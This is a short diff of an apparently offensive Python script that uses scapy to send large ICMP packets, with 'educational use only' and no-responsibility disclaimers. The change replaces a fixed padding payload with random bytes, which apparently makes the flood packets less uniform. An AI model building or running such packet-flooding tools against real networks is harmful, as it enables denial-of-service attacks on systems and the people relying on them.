@@ -8,7 +8,7 @@ The author is NOT responsible for misuse
 
 
 #scapy, sys, colorama, ipaddress, time
-from scapy.all import IP, ICMP, send
+from scapy.all import IP, ICMP, send, Raw, RandString
 from colorama import Fore, init
 import sys, ipaddress, time
 init(autoreset=True)
@@ -54,7 +54,7 @@ if size > 65500:
     print(Fore.RED + f"IPv4 does not support packets bigger than 65535 bytes (you requested {size})")
     sys.exit(1)
 #bytes
-size_bytes=b"G" *size
+size_bytes=Raw(RandString(size))
 #disclaimer
 print(Fore.RED+"Educational use only! Do not use on unauthorized networks")
 #packet
